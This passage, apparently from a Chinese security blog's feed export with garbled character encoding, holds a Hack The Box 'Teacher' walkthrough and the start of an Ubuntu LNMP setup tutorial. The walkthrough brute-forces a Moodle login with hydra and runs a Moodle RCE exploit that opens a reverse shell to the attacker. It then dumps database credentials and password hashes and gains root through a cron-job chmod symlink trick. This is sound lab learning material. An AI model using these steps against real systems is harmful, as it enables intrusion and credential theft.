<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322145643.png" alt=""></p>
<p>ç”¨hydraçˆ†ç ´å¯†ç ä¹‹å‰å…ˆç”¨Pythonç”Ÿæˆä¸€ä¸ªå¯†ç å­—å…¸ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;pwd.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">127</span>):</span><br><span class="line">        f.write(<span class="string">&#x27;Th4C00lTheacha&#123;&#125;\n&#x27;</span>.format(chr(i)))</span><br></pre></td></tr></table></figure>
<p>å†ç”¨hydraè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œç”±äºåªæœ‰åœ¨æˆ‘ä»¬æäº¤æ­£ç¡®çš„å¯†ç åæ‰è®¾ç½®Cookieï¼Œå› æ­¤æˆ‘ä»¬ä¼šåœ¨<code>Set-Cookie</code>ä¸Šå°†å…¶åŒ¹é…ä¸ºæ­£ç¡®çš„å“åº”ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hydra -I -l giovanni -P pwd.txt 10.10.10.153 http-post-form &quot;&#x2F;moodle&#x2F;login&#x2F;index.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;Set-Cookie&quot;</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser&#x2F;THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2020-03-22 04:23:47</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 128 login tries (l:1&#x2F;p:128), ~8 tries per task</span><br><span class="line">[DATA] attacking http-post-form:&#x2F;&#x2F;10.10.10.153:80&#x2F;moodle&#x2F;login&#x2F;index.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;Set-Cookie</span><br><span class="line">[80][http-post-form] host: 10.10.10.153   login: giovanni   password: Th4C00lTheacha#</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2020-03-22 04:23:58</span><br></pre></td></tr></table></figure>
<p>æ‰¾åˆ°äº†å¯†ç <code>login: giovanni&amp;password: Th4C00lTheacha#</code>ã€‚</p>
<p>åŒæ—¶ç”¨niktoæ‰«æä¸€ä¸‹æœ‰ç”¨çš„ä¿¡æ¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nikto -host http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle                                                         - Nikto v2.1.6                                                                                   ---------------------------------------------------------------------------                     + Target IP:          10.10.10.153                                                               + Target Hostname:    10.10.10.153</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-03-22 02:49:41 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">+ Cookie MoodleSession created without the httponly flag</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ Uncommon header &#39;content-script-type&#39; found, with contents: text&#x2F;javascript</span><br><span class="line">+ Uncommon header &#39;content-style-type&#39; found, with contents: text&#x2F;css</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span><br><span class="line">+ Apache&#x2F;2.4.25 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ DEBUG HTTP verb may show server debugging information. See http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;e8z01xdh%28VS.80%29.aspx for details.</span><br><span class="line">+ &#x2F;moodle&#x2F;config.php: PHP Config file may contain database IDs and passwords.</span><br><span class="line">+ Uncommon header &#39;x-accel-buffering&#39; found, with contents: no</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;auth&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3268: &#x2F;moodle&#x2F;backup&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;backup&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3268: &#x2F;moodle&#x2F;install&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;install&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;lib&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;login&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3268: &#x2F;moodle&#x2F;pix&#x2F;: Directory indexing found.</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;pix&#x2F;: This might be interesting...</span><br><span class="line">+ OSVDB-3092: &#x2F;moodle&#x2F;INSTALL.txt: Default file found.</span><br><span class="line">+ OSVDB-3268: &#x2F;moodle&#x2F;repository&#x2F;: Directory indexing found.</span><br><span class="line">+ &#x2F;moodle&#x2F;repository&#x2F;: CRX WebDAV upload</span><br><span class="line">+ &#x2F;moodle&#x2F;composer.json: PHP Composer configuration file reveals configuration information - https:&#x2F;&#x2F;getcomposer.org&#x2F;</span><br><span class="line">+ &#x2F;moodle&#x2F;composer.lock: PHP Composer configuration file reveals configuration information - https:&#x2F;&#x2F;getcomposer.org&#x2F;</span><br><span class="line">+ &#x2F;moodle&#x2F;package.json: Node.js package file found. It may contain sensitive information.</span><br><span class="line">+ 7871 requests: 0 error(s) and 26 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-03-22 03:27:50 (GMT-4) (2289 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
<p>ä¸»è¦æ˜¯æœ‰ä¸¤ä¸ªæ–‡ä»¶å€¼å¾—æ³¨æ„ï¼š</p>
<ul>
<li><code>/moodle/config.php</code></li>
<li><code>/moodle/INSTALL.txt</code></li>
</ul>
<p>configé…ç½®æ–‡ä»¶ä¹‹åä¼šç”¨åˆ°ï¼Œè€ŒINSTALLæ–‡ä»¶å‘Šè¯‰äº†æˆ‘ä»¬å½“å‰moodleçš„ç‰ˆæœ¬æ˜¯3.2ã€‚</p>
<p>æœä¸€ä¸‹moodleç›¸å…³çš„æ¼æ´ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322164229.png" alt=""></p>
<p>è¯•ä¸€ä¸‹<code>Moodle 3.4.1 - Remote Code Execute</code>çš„åˆ©ç”¨æ–¹å¼ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ sudo php 46551.php url&#x3D;http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#x2F; user&#x3D;giovanni pass&#x3D;Th4C00lTheacha# ip&#x3D;10.10.16.89 port&#x3D;4444 course&#x3D;2</span><br><span class="line"></span><br><span class="line">*------------------------------*</span><br><span class="line">* Noodle [Moodle RCE] (v3.4.1) *</span><br><span class="line">*------------------------------*</span><br><span class="line"></span><br><span class="line">[!] Make sure you have a listener</span><br><span class="line">[!] at 10.10.16.89:4444</span><br><span class="line"></span><br><span class="line">[*] Logging in as user giovanni with password Th4C00lTheacha# </span><br><span class="line">[+] Successful Login</span><br><span class="line">[&gt;] Moodle Session q86b6t60vldlqjk0gp90u5mat0 </span><br><span class="line">[&gt;] Moodle Key N25C2hyBzu </span><br><span class="line">[*] Loading Course ID 2 </span><br><span class="line">[+] Successfully Loaded Course</span><br><span class="line">[*] Enable Editing</span><br><span class="line">[+] Successfully Enabled Course Editing</span><br><span class="line">[*] Adding Quiz</span><br><span class="line">[+] Successfully Added Quiz</span><br><span class="line">[*] Configuring New Quiz</span><br><span class="line">[+] Successfully Configured Quiz</span><br><span class="line">[*] Loading Edit Quiz Page </span><br><span class="line">[+] Successfully Loaded Edit Quiz Page</span><br><span class="line">[*] Adding Calculated Question </span><br><span class="line">[+] Successfully Added Calculation Question</span><br><span class="line">[*] Adding Evil Question </span><br><span class="line">[+] Successfully Created Evil Question</span><br><span class="line">[*] Sending Exploit</span><br><span class="line"></span><br><span class="line">[&gt;] You should receive a reverse shell attempt from the target at 10.10.16.89 on port 4444 </span><br><span class="line">[&gt;] If connection was successful this program will wait here until you close the connection.</span><br><span class="line">[&gt;] You should be able to Ctrl+C and retain the connection through netcat.</span><br></pre></td></tr></table></figure>
<p>æœ¬æœºç›‘å¬4444ç«¯å£</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nc -lvvp 4444                                                                                 listening on [any] 4444 ...                                                                     10.10.10.153: inverse host lookup failed: Unknown host                                           connect to [10.10.16.89] from (UNKNOWN) [10.10.10.153] 42232                                    &#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off                                             $ python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;                                                 www-data@teacher:&#x2F;var&#x2F;www&#x2F;html&#x2F;moodle&#x2F;question$ id                                               id                                                                                               uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹<code>config.php</code>ç½‘ç«™æ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@teacher:&#x2F;var&#x2F;www&#x2F;html&#x2F;moodle$ cat config.php</span><br><span class="line">cat config.php</span><br><span class="line">&lt;?php  &#x2F;&#x2F; Moodle configuration file</span><br><span class="line"></span><br><span class="line">unset($CFG);</span><br><span class="line">global $CFG;</span><br><span class="line">$CFG &#x3D; new stdClass();</span><br><span class="line"></span><br><span class="line">$CFG-&gt;dbtype    &#x3D; &#39;mariadb&#39;;</span><br><span class="line">$CFG-&gt;dblibrary &#x3D; &#39;native&#39;;</span><br><span class="line">$CFG-&gt;dbhost    &#x3D; &#39;localhost&#39;;</span><br><span class="line">$CFG-&gt;dbname    &#x3D; &#39;moodle&#39;;</span><br><span class="line">$CFG-&gt;dbuser    &#x3D; &#39;root&#39;;</span><br><span class="line">$CFG-&gt;dbpass    &#x3D; &#39;Welkom1!&#39;;</span><br><span class="line">$CFG-&gt;prefix    &#x3D; &#39;mdl_&#39;;</span><br><span class="line">$CFG-&gt;dboptions &#x3D; array (</span><br><span class="line">  &#39;dbpersist&#39; &#x3D;&gt; 0,</span><br><span class="line">  &#39;dbport&#39; &#x3D;&gt; 3306,</span><br><span class="line">  &#39;dbsocket&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">  &#39;dbcollation&#39; &#x3D;&gt; &#39;utf8mb4_unicode_ci&#39;,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$CFG-&gt;wwwroot   &#x3D; &#39;http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#39;;</span><br><span class="line">$CFG-&gt;dataroot  &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;moodledata&#39;;</span><br><span class="line">$CFG-&gt;admin     &#x3D; &#39;admin&#39;;</span><br><span class="line"></span><br><span class="line">$CFG-&gt;directorypermissions &#x3D; 0777;</span><br><span class="line"></span><br><span class="line">require_once(__DIR__ . &#39;&#x2F;lib&#x2F;setup.php&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; There is no php closing tag in this file,</span><br><span class="line">&#x2F;&#x2F; it is intentional because it prevents trailing whitespace problems!</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œåˆ—å‡ºäº†MySQLæ•°æ®åº“çš„ç™»å½•ç”¨æˆ·åå’Œå¯†ç ï¼š<code>root</code>å’Œ<code>Welkom1!</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ mysql -u root -p                                           mysql -u root -p                                                                                 Enter password: Welkom1!                                                                         Welcome to the MariaDB monitor.  Commands end with ; or \g.                                    Your MariaDB connection id is 949                                                               Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1                                             Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.                             Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line">......</span><br><span class="line">MariaDB [moodle]&gt; select username, password from mdl_user;</span><br><span class="line">select username, password from mdl_user;</span><br><span class="line">+-------------+--------------------------------------------------------------+</span><br><span class="line">| username    | password                                                     |</span><br><span class="line">+-------------+--------------------------------------------------------------+</span><br><span class="line">| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |</span><br><span class="line">| admin       | $2y$10$7VPsdU9&#x2F;9y2J4Mynlt6vM.a4coqHRXsNTOq&#x2F;1aA6wCWTsF2wtrDO2 |</span><br><span class="line">| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf&#x2F;M1Zkj&#x2F;i1VqLO0FSYO |</span><br><span class="line">| Giovannibak | 7a860966115182402ed06375cf0a22af                             |</span><br><span class="line">+-------------+--------------------------------------------------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹é‚£ä¸€ä¸²æ•°å­—çš„åŠ å¯†æ–¹å¼</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hash-identifier 7a860966115182402ed06375cf0a22af</span><br><span class="line">   #########################################################################</span><br><span class="line">   #     __  __                     __           ______    _____           #</span><br><span class="line">   #    &#x2F;\ \&#x2F;\ \                   &#x2F;\ \         &#x2F;\__  _\  &#x2F;\  _ &#96;\         #</span><br><span class="line">   #    \ \ \_\ \     __      ____ \ \ \___     \&#x2F;_&#x2F;\ \&#x2F;  \ \ \&#x2F;\ \        #</span><br><span class="line">   #     \ \  _  \  &#x2F;&#39;__&#96;\   &#x2F; ,__\ \ \  _ &#96;\      \ \ \   \ \ \ \ \       #</span><br><span class="line">   #      \ \ \ \ \&#x2F;\ \_\ \_&#x2F;\__, &#96;\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span><br><span class="line">   #       \ \_\ \_\ \___ \_\&#x2F;\____&#x2F;  \ \_\ \_\     &#x2F;\_____\ \ \____&#x2F;      #</span><br><span class="line">   #        \&#x2F;_&#x2F;\&#x2F;_&#x2F;\&#x2F;__&#x2F;\&#x2F;_&#x2F;\&#x2F;___&#x2F;    \&#x2F;_&#x2F;\&#x2F;_&#x2F;     \&#x2F;_____&#x2F;  \&#x2F;___&#x2F;  v1.2 #</span><br><span class="line">   #                                                             By Zion3R #</span><br><span class="line">   #                                                    www.Blackploit.com #</span><br><span class="line">   #                                                   Root@Blackploit.com #</span><br><span class="line">   #########################################################################</span><br><span class="line">--------------------------------------------------</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br></pre></td></tr></table></figure>
<p><code>7a860966115182402ed06375cf0a22af</code>md5è§£å¯†</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322203948.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ su giovanni</span><br><span class="line">su giovanni</span><br><span class="line">Password: expelled</span><br><span class="line"></span><br><span class="line">giovanni@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;1000(giovanni) gid&#x3D;1000(giovanni) groups&#x3D;1000(giovanni)</span><br><span class="line">giovanni@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ ls &#x2F;home&#x2F;giovanni&#x2F;  </span><br><span class="line">ls &#x2F;home&#x2F;giovanni&#x2F;</span><br><span class="line">user.txt  work</span><br></pre></td></tr></table></figure>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">giovanni@teacher:~&#x2F;work$ ls -lR</span><br><span class="line">ls -lR</span><br><span class="line">.:</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 courses</span><br><span class="line">drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp</span><br><span class="line"></span><br><span class="line">.&#x2F;courses:</span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 2 root root 4096 Jun 27  2018 algebra</span><br><span class="line"></span><br><span class="line">.&#x2F;courses&#x2F;algebra:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 giovanni giovanni 109 Jun 27  2018 answersAlgebra</span><br><span class="line"></span><br><span class="line">.&#x2F;tmp:</span><br><span class="line">total 8</span><br><span class="line">-rwxrwxrwx 1 root root  256 Mar 22 16:08 backup_courses.tar.gz</span><br><span class="line">drwxrwxrwx 3 root root 4096 Jun 27  2018 courses</span><br><span class="line"></span><br><span class="line">.&#x2F;tmp&#x2F;courses:</span><br><span class="line">total 4</span><br><span class="line">drwxrwxrwx 2 root root 4096 Jun 27  2018 algebra</span><br><span class="line"></span><br><span class="line">.&#x2F;tmp&#x2F;courses&#x2F;algebra:</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 giovanni giovanni 109 Jun 27  2018 answersAlgebra</span><br><span class="line">giovanni@teacher:~&#x2F;work$ date</span><br><span class="line">date</span><br><span class="line">Sun Mar 22 16:08:17 CET 2020</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°<code>/tmp/backup_courses.tar.gz</code>çš„æ—¶é—´å°±æ˜¯å½“å‰çš„æ—¶é—´ï¼ŒçŒœæµ‹è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ã€‚</p>
<p>å®šæ—¶ä»»åŠ¡çš„è„šæœ¬ä½äº<code>/usr/bin/backup.sh</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">cd &#x2F;home&#x2F;giovanni&#x2F;work;</span><br><span class="line">tar -czvf tmp&#x2F;backup_courses.tar.gz courses&#x2F;*;</span><br><span class="line">cd tmp;</span><br><span class="line">tar -xf backup_courses.tar.gz;</span><br><span class="line">chmod 777 * -R;</span><br></pre></td></tr></table></figure>
<p>æˆ‘é—¨åªéœ€è¦çœ‹åˆ°è¿™ä¸ªè„šæœ¬æ‰§è¡Œå<code>~/tmp</code>ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æƒé™å˜æˆäº†777ï¼Œé‚£ä¹ˆç°åœ¨å°±å¾ˆå®¹æ˜“äº†ï¼Œåœ¨tmpç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ ¹ç›®å½•çš„è½¯è¿æ¥å³å¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">giovanni@teacher:~&#x2F;work&#x2F;tmp$ ln -s &#x2F; ca01h</span><br><span class="line">ln -s &#x2F; ca01h</span><br><span class="line">giovanni@teacher:~&#x2F;work&#x2F;tmp$ ls -la &#x2F;</span><br><span class="line">ls -la &#x2F;</span><br><span class="line">total 84</span><br><span class="line">drwxrwxrwx 22 root root  4096 Oct 28  2018 .</span><br><span class="line">drwxrwxrwx 22 root root  4096 Oct 28  2018 ..</span><br><span class="line">drwxrwxrwx  2 root root  4096 Oct 28  2018 bin</span><br><span class="line">drwxrwxrwx  3 root root  4096 Oct 28  2018 boot</span><br><span class="line">drwxrwxrwx 17 root root  3080 Mar 22 05:06 dev</span><br><span class="line">drwxrwxrwx 84 root root  4096 Oct 28  2018 etc</span><br><span class="line">drwxrwxrwx  3 root root  4096 Jun 27  2018 home</span><br><span class="line">lrwxrwxrwx  1 root root    29 Oct 28  2018 initrd.img -&gt; boot&#x2F;initrd.img-4.9.0-8-amd64</span><br><span class="line">lrwxrwxrwx  1 root root    29 Oct 28  2018 initrd.img.old -&gt; boot&#x2F;initrd.img-4.9.0-6-amd64</span><br><span class="line">drwxrwxrwx 15 root root  4096 Jun 27  2018 lib</span><br><span class="line">drwxrwxrwx  2 root root  4096 Jun 27  2018 lib64</span><br><span class="line">drwxrwxrwx  2 root root 16384 Jun 27  2018 lost+found</span><br><span class="line">drwxrwxrwx  3 root root  4096 Jun 27  2018 media</span><br><span class="line">drwxrwxrwx  2 root root  4096 Jun 27  2018 mnt</span><br><span class="line">drwxrwxrwx  2 root root  4096 Jun 27  2018 opt</span><br><span class="line">drwxrwxrwx 93 root root     0 Mar 22 05:06 proc</span><br><span class="line">drwxrwxrwx  3 root root  4096 Nov  4  2018 root</span><br><span class="line">drwxrwxrwx 18 root root   500 Mar 22 05:06 run</span><br><span class="line">drwxrwxrwx  2 root root  4096 Oct 28  2018 sbin</span><br><span class="line">drwxrwxrwx  2 root root  4096 Jun 27  2018 srv</span><br><span class="line">drwxrwxrwx 13 root root     0 Mar 22 16:19 sys</span><br><span class="line">drwxrwxrwx  2 root root  4096 Mar 22 06:26 tmp</span><br><span class="line">drwxrwxrwx 10 root root  4096 Jun 27  2018 usr</span><br><span class="line">drwxrwxrwx 12 root root  4096 Jun 27  2018 var</span><br><span class="line">lrwxrwxrwx  1 root root    26 Oct 28  2018 vmlinuz -&gt; boot&#x2F;vmlinuz-4.9.0-8-amd64</span><br><span class="line">lrwxrwxrwx  1 root root    26 Oct 28  2018 vmlinuz.old -&gt; boot&#x2F;vmlinuz-4.9.0-6-amd64</span><br><span class="line">giovanni@teacher:~&#x2F;work&#x2F;tmp$ ls -la &#x2F;root&#x2F;root.txt</span><br><span class="line">ls -la &#x2F;root&#x2F;root.txt</span><br><span class="line">-rwxrwxrwx 1 root root 33 Jun 27  2018 &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure>
<h2 id="0x04-CVE-Analysis">0x04 CVE Analysis</h2>
<p><a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">https://blog.ripstech.com/2018/moodle-remote-code-execution/</a></p>
<h2 id="0x05-Conclusion">0x05 Conclusion</h2>
<p>æ¸—é€è¿‡ç¨‹ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200322233257.png" alt=""></p>
<h2 id="0x06-Reference">0x06 Reference</h2>
<p><a href="https://ech1.netlify.com/htb/easy/26">https://ech1.netlify.com/htb/easy/26</a></p>
<p><a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">https://blog.ripstech.com/2018/moodle-remote-code-execution/</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹Ubuntu18.04å®‰è£…LNMP</title>
    <url>/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP/</url>
    <content><![CDATA[<h2 id="æœ¬å‘¨ç›®æ ‡">æœ¬å‘¨ç›®æ ‡</h2>
<ul>
<li>ä»»åŠ¡ç›®æ ‡ï¼šå‡†å¤‡å­¦ä¹ ç¯å¢ƒï¼Œæ­å»ºWebæœåŠ¡å™¨ï¼Œå¹¶åšç›¸åº”çš„æœåŠ¡å™¨åŠ å›ºå­¦ä¹ </li>
<li>æ¨èç¯å¢ƒï¼šlinux+nginx+php-fpm+mysql</li>
<li>é¢„æœŸç»“æœï¼šèƒ½å¤Ÿè¿è¡Œ php ä»£ç å¹¶ä¸”å¯ä»¥ä½¿ç”¨ php è¿æ¥ mysqlï¼ŒæˆåŠŸæ‰§è¡Œ mysql çš„è¯­å¥</li>
<li>æ‹“å±•å®éªŒï¼šå¯ä»¥æ­å»ºåŸºäº Apache çš„ç¯å¢ƒã€åŸºäº Windows Server çš„ IIS ç¯å¢ƒç­‰</li>
</ul>
<h2 id="åŸºæœ¬ç¯å¢ƒ">åŸºæœ¬ç¯å¢ƒ</h2>
<ul>
<li>VMware Workstation Player 15</li>
<li>Ubuntu 18.04.2 LTS</li>
</ul>
<h2 id="ç¯å¢ƒæ­å»º">ç¯å¢ƒæ­å»º</h2>
<h3 id="å®‰è£…Nginx">å®‰è£…Nginx</h3>
<ol>
<li>
<h5 id="Install-Nginx">Install Nginx</h5>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service nginx status</span><br></pre></td></tr></table></figure>
<p>å¦‚æœNginxå¯åŠ¨æˆåŠŸï¼Œä¼šæœ‰å¦‚ä¸‹æ˜¾ç¤ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">â— nginx.service - A high performance web server and a reverse proxy server</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/nginx.service; enabled; vendor preset: en</span><br><span class="line">   Active: active (running) since Sat 2019-07-27 13:12:44 CST; 39s ago</span><br><span class="line">     Docs: man:nginx(8)</span><br><span class="line"> Main PID: 5836 (nginx)</span><br><span class="line">    Tasks: 2 (<span class="built_in">limit</span>: 3433)</span><br><span class="line">   CGroup: /system.slice/nginx.service</span><br><span class="line">           â”œâ”€5836 nginx: master process /usr/sbin/nginx -g daemon on; master_pro</span><br><span class="line">           â””â”€5837 nginx: worker process</span><br></pre></td></tr></table></figure>
</li>
<li>
<h5 id="Configure-Firewall">Configure Firewall</h5>
<blockquote>
<p><a href="https://help.ubuntu.com/lts/serverguide/firewall.html">ubuntuå®˜æ–¹æ–‡æ¡£</a>æœ‰å¯¹ufwè¿›è¡Œç®€å•çš„ä»‹ç»</p>
</blockquote>
<p>é…ç½®ufwå…è®¸sshã€httpã€httpsè¿æ¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw allow ssh</span><br><span class="line">sudo ufw allow http</span><br><span class="line">sudo ufw allow https</span><br></pre></td></tr></table></figure>
<p>å¯åŠ¨ufwï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw <span class="built_in">enable</span></span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨ä¸‹é¢å‘½ä»¤æ£€æŸ¥é˜²ç«å¢™çŠ¶æ€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ufw status</span><br><span class="line"></span><br><span class="line">Status: active</span><br><span class="line"></span><br><span class="line">To                         Action      From</span><br><span class="line">--                         ------      ----</span><br><span class="line">22/tcp                     ALLOW       Anywhere                  </span><br><span class="line">80/tcp                     ALLOW       Anywhere                  </span><br><span class="line">443/tcp                    ALLOW       Anywhere                  </span><br><span class="line">22/tcp (v6)                ALLOW       Anywhere (v6)             </span><br><span class="line">80/tcp (v6)                ALLOW       Anywhere (v6)             </span><br><span class="line">443/tcp (v6)               ALLOW       Anywhere (v6)  </span><br></pre></td></tr></table></figure>
<p>åœ¨è¿™é‡Œï¼Œå¯ä»¥çœ‹åˆ°ç«¯å£22ï¼ˆSSHï¼‰ï¼Œ80ï¼ˆhttpsï¼‰å’Œ443ï¼ˆhttpsï¼‰å¯¹IPv4å’ŒIPv6éƒ½æ˜¯å¼€æ”¾çš„ã€‚</p>
<blockquote>
<p>centos7 firewalldæ“ä½œï¼š</p>
<p>æ·»åŠ </p>
<p>firewall-cmd --zone=public --add-port=80/tcp --permanent  ï¼ˆâ€“permanentæ°¸ä¹…ç”Ÿæ•ˆï¼Œæ²¡æœ‰æ­¤å‚æ•°é‡å¯åå¤±æ•ˆï¼‰</p>
<p>é‡æ–°è½½å…¥</p>
<p>firewall-cmd --reload</p>
<p>æŸ¥çœ‹</p>
<p>firewall-cmd --zone=public --query-port=80/tcp</p>
<p>åˆ é™¤</p>
<p>firewall-cmd --zone=public --remove-port=80/tcp --permanent</p>
<p>æŸ¥çœ‹æ‰€æœ‰å¼€æ”¾çš„ç«¯å£</p>
<p>firewall-cmd --zone=public --list-ports</p>
</blockquote>
</li>
<li>
<h5 id="Test-Nginx">Test Nginx</h5>
<p>ä½¿ç”¨<code>ifconfig</code>æŸ¥çœ‹æœ¬æœºIPåœ°å€<code>192.168.11.131</code></p>
<p>åœ¨æµè§ˆå™¨ä¸­è®¿é—®æœ¬æœºIPåœ°å€<code>http://192.168.11.131/</code>ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g5echydw86j20l00dr0tf.jpg" alt=""></p>
</li>
</ol>
<h3 id="å®‰è£…MySQL">å®‰è£…MySQL</h3>
<ol>
<li>
<h5 id="Install-MySQL">Install MySQL</h5>
<p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤å®‰è£…MySQLï¼š</p>
